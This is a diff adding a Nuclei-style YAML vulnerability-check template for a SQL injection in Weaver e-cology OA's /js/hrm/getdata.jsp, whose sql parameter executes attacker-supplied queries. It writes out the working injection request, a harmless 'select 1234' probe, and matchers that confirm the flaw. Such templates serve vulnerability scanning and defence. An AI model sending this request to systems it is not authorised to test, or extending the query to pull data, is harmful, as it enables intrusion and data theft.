@@ -1,0 +1,24 @@
+id: weaver-e-cology-oa-sqli
+info:
+  name: Weaver e-cology OA getdata.jsp SQL Injection
+  author: ProjectDiscoveryAI
+  severity: high
+  description: |
+    Weaver e-cology collaborative business office system has SQL injection vulnerabilities, which may cause data leakage and even server intrusion.
+  tags: sqli
+  reference:
+    - https://www.weaver.com.cn
+http:
+  - raw:
+      - |
+        GET /js/hrm/getdata.jsp?cmd=getSelectAllId&sql=select%201234%20as%20id HTTP/1.1
+        Host: {{Hostname}}
+    matchers-condition: and
+    matchers:
+      - type: status
+        status:
+          - 200
+      - type: word
+        words:
+          - "1234"
+        part: body
